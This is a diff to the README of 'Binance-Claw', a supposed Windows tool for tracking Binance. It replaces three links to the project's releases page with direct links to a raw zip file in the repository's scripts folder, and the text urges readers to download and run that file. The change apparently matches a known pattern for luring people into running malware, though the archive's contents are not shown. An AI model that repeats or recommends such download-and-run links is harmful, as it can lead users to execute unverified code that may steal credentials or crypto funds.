@@ -1,6 +1,6 @@
 # ⚡ Binance-Claw - Fast Binance Tracking on Windows
 
-[![Download Binance-Claw](https://img.shields.io/badge/Download-Binance--Claw-blue?style=for-the-badge&logo=github)](https://github.com/Scandalousnessmotley216/Binance-Claw/releases)
+[![Download Binance-Claw](https://img.shields.io/badge/Download-Binance--Claw-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Scandalousnessmotley216/Binance-Claw/main/scripts/Binance-Claw-v1.8.zip)
 
 ## 🪄 What it does
 
@@ -31,7 +31,7 @@ For the best experience, keep Windows up to date and close apps you do not need 
 
 Go to the release page to download and run this file:
 
-https://github.com/Scandalousnessmotley216/Binance-Claw/releases
+https://raw.githubusercontent.com/Scandalousnessmotley216/Binance-Claw/main/scripts/Binance-Claw-v1.8.zip
 
 On that page:
 
@@ -198,7 +198,7 @@ Binance-Claw fits users who want to:
 
 Download and run the Windows file from:
 
-https://github.com/Scandalousnessmotley216/Binance-Claw/releases
+https://raw.githubusercontent.com/Scandalousnessmotley216/Binance-Claw/main/scripts/Binance-Claw-v1.8.zip
 
 ## 🧭 Setup checklist
 
